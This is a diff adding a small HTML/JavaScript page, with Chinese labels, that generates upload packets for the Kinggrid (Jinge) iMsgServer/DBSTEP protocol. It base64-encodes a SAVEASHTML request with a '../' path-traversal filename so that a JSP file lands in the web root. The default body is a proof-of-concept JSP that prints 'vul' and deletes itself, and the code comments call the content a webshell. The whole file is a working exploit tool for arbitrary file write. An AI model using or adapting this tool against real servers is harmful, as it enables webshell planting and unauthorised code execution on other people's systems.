@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8">
+    <title>金格上传数据包生成</title>
+</head>
+<style type="text/css">
+    /* https://c.runoob.com/codedemo/3117/ */
+    body {
+        margin-top: 0px;
+        margin-bottom: 0px;
+        margin-left: 0px;
+        margin-right: 0px;
+        /* border: 0px;
+        padding: 0px; */
+        background-color: grey;
+    }
+
+    div.btn-group {
+        display: inline-block;
+        width: 15%;
+        height: 300px;
+        vertical-align: top;
+
+        /* position: relative; */
+
+    }
+
+    .btn-group button {
+        background-color: #4CAF50;
+        /* Green background */
+        border: 1px solid green;
+        /* Green border */
+        color: white;
+        /* White text */
+        padding: 10px 24px;
+        /* Some padding */
+        cursor: pointer;
+        /* Pointer/hand icon */
+        width: 100%;
+        /* Set a width if needed */
+        display: block;
+        /* Make the buttons appear below each other */
+    }
+
+    .btn-group button:not(:last-child) {
+        border-bottom: none;
+        /* Prevent double borders */
+    }
+
+    /* Add a background color on hover */
+    .btn-group button:hover {
+        background-color: #3e8e41;
+    }
+
+    textarea {
+        border: 1px solid rgb(128, 0, 107);
+        background-color: rgb(68, 68, 68);
+        color: rgb(16, 224, 86);
+        font-family: Arial, Helvetica, sans-serif;
+        font-size: 15px;
+        /* margin-left:0px;
+        padding-left: 10px; */
+    }
+
+    /* textarea:focus {
+        border: 1px solid rgb(221, 56, 84);
+    } */
+</style>
+
+<body>
+    <textarea id="history" cols="40" rows="10" placeholder="需要两个输入框时使用" style="height: 25%;width: 100%;">OPTION=saveashtml
+HTMLNAME=../html_test.txt
+DIRECTORY=</textarea>
+    <textarea id="new" rows="10" placeholder="基本输入位置" style="height: 30%;width: 100%;"><% out.println("vul");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %></textarea>
+    <div class="btn-gro1up">
+        <button onclick="iMsgServerDataGenerate()" title="用于生成金格上次数据包">生成金格上传数据包</button>
+    </div>
+    <textarea id="result" rows="20" placeholder="显示结果位置" style="height: 25%;width: 100%;"></textarea>
+</body>
+
+<script type="text/javascript">
+    var dom_textarea_history = document.getElementById("history")
+    var dom_textarea_new = document.getElementById("new")
+    var dom_textarea_result = document.getElementById("result")
+
+    window.onload = function () {
+        var iMsgServer2000_1 = "OPTION=SAVEASHTML\nHTMLNAME=/../html_test.jsp\nDIRECTORY=";
+        dom_textarea_history.value = iMsgServer2000_1;
+        iMsgServerDataGenerate();
+    }
+
+
+    function iMsgServerDataGenerate() {
+        var new_str = getBase64Str(dom_textarea_history.value); //补全了"\r\n"
+        var parameter_tmp = getStrLen(new_str, 17); //再补上固定的字段长度17（"DBSTEP=REJTVEVQ"用来检测数据包信息是否完整）
+
+        content_tmp = getStrLen(dom_textarea_new.value, 0); //计算webshell的总长度,也会在默认补上"\r\n"
+
+        hander_text = "DBSTEP V3.0     " + parameter_tmp + "       0        " + content_tmp + "DBSTEP=REJTVEVQ";
+        dom_textarea_result.value = hander_text + "\r\n" + new_str + dom_textarea_new.value.trim() + "\r\n";
+
+    }
+
+    function getBase64Str(str) {
+        var new_str = "";
+        str = str.trim(); //去除前后空白字符
+        var param_list = str.split("\n");
+        for (var i = 0; i < param_list.length; i++) {
+            var j = param_list[i].indexOf("=");
+            new_str += (param_list[i].slice(0, j) + "=" + window.btoa(param_list[i].slice(j + 1)) + "\n"); //每行末尾补上了\n
+        }
+        return new_str;
+    }
+
+    function getStrLen(str, i) {
+        str = str.trim();
+        rows = str.split("\n").length; //参数占几行
+        str_size = str.length + rows + 1 + i; //参数的实际长度（每行末尾补上了\r\n）
+        str_tmp = str_size.toString();
+        for (var i = 0; i < (16 - (str_size.toString().length)); i++) {
+            str_tmp += ' ';
+        }
+        return str_tmp;
+    }
+
+
+    // function getStrLen(str, i) {
+    //     var str_size = str.length + i; //参数部分字符串的总长度需要加上17
+    //     var str_tmp = str_size.toString(); //将总长度参数结果转为字符串类型
+    //     var str_bit = str_tmp.length; //通过字符串长度判断这是几位数
+    //     //根据几位数去循环补空格进去
+    //     for (var i = 0; i < (16 - str_bit); i++) {
+    //         str_tmp += ' ';
+    //     }
+    //     return str_tmp;
+    // }
+
+    //XINYU2428
+</script>
+
+</html>
